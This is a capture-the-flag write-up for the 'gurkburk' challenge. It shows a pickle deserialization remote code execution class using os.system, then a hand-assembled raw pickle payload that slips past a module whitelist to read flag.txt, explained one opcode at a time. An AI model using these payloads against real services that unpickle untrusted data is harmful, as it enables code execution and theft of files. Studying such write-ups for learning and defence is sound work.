# writeup for gurkburk
The ultimate goal is to read `flag.txt`

Since the server allows us to load pickle object, we can try a typical pickle RCE first:
```
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('cat ./flag.txt')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Unfortunately, the server reject our input for using modules outside `__main__` and `__builtin__`.

Knowning that, we need to build a payload that only uses functions from the 2 modules such as `print()` and `open()` ...

The code we need to run is:
```
print(open('./flag.txt','r').read())
```

One way of doing it is to chain multiple python classes to form a complicated `__reduce__` function: [writeup](https://gist.github.com/toblu302/364c3b474c4148295fdee9bd0207e758)

Instead, I choose to write in raw pickle object format. Read [this blog](https://rushter.com/blog/pickle-serialization-internals/) for more information

One tricky part of this method is that we cannot directly chain functions like this: `open('file', 'r').read()`.

Alternatively, we need to use `getattr()` to chain functions like this: `getattr(open('file','r'), 'read')()`

Final payload:
```
c__builtin__
open
(S'./flag.txt'
S'r'
tRp1
c__builtin__
getattr
(g1
S'read'
tR(tRp2
c__builtin__
print
(g2
tR.
```

Explanation:

Push `open()` function from `__builtin__` modules to stack:
```
c__builtin__
open
```

Push the desired arguments to stack:
```
(S'./flag.txt'
S'r'
t
```

Take the arguments and functions from the stack, execute and store the function output to memory space 1

(equivalent to `m1=open('flag.txt','r')`)

```
Rp1
```

Push `getattr()` function to stack:
```
c__builtin__
getattr
```

Get the output from last function (file object stored in memory space 1) as the argument 1, push `read` as the second argument

```
(g1
S'read'
```

Run `getattr(open('flag.txt', 'r'), 'read')`:
```
tR
```

Run `getattr(open('flag.txt', 'r'), 'read')()` (equivalent to `open('flag.txt').read()`) and store the function output (flag string) to memory space 2:
```
(tRp2
```

Print flag string:
```
c__builtin__
print
(g2
tR.
```

So the final payload is `c__builtin__\nopen\n(S'./flag.txt'\nS'r'\ntRp1\nc__builtin__\ngetattr\n(g1\nS'read'\ntR(tRp2\nc__builtin__\nprint\n(g2\ntR.`

Base64 encode it and send to server, and we can get the flag.